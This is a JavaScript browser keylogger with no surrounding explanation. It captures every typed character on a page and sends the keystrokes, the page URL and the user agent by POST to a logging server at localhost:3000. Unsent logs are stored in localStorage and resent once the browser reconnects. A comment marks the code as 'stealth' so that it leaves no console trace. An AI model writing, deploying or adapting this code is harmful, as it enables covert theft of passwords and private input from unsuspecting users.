let buffer = '';
let lastSendTime = Date.now();
let sendTimeout = null;

function sendBuffer() {
  if (!buffer) return;
  const payload = {
    key: buffer,
    type: 'sequence',
    url: window.location.href,
    timestamp: new Date().toISOString(),
    userAgent: navigator.userAgent
  };
  fetch("http://localhost:3000/log", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(payload),
  }).then(() => {
    lastSendTime = Date.now();
    buffer = '';
    // Try to resend any offline logs
    resendOfflineLogs();
  }).catch(() => {
    // Save to localStorage if offline or failed
    saveOfflineLog(payload);
    buffer = '';
  });
}

function saveOfflineLog(payload) {
  let offlineLogs = [];
  try {
    offlineLogs = JSON.parse(localStorage.getItem('offlineKeylogs') || '[]');
  } catch {}
  offlineLogs.push(payload);
  localStorage.setItem('offlineKeylogs', JSON.stringify(offlineLogs));
}

function resendOfflineLogs() {
  let offlineLogs = [];
  try {
    offlineLogs = JSON.parse(localStorage.getItem('offlineKeylogs') || '[]');
  } catch {}
  if (offlineLogs.length > 0) {
    offlineLogs.forEach(log => {
      fetch("http://localhost:3000/log", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(log),
      });
    });
    localStorage.removeItem('offlineKeylogs');
  }
}

function scheduleSend() {
  if (sendTimeout) clearTimeout(sendTimeout);
  sendTimeout = setTimeout(() => {
    sendBuffer();
  }, 2000); // 2 seconds inactivity
}

document.addEventListener("keydown", function (event) {
  // Stealth: no console logs
  if ((event.key === ' ' || event.key === 'Enter' || event.key === 'Tab') && buffer) {
    sendBuffer();
  } else if (event.key === 'Backspace') {
    buffer = buffer.slice(0, -1);
  } else if (event.key.length === 1 && !event.ctrlKey && !event.altKey && !event.metaKey) {
    buffer += event.key;
    scheduleSend();
  }
});

window.addEventListener('online', resendOfflineLogs);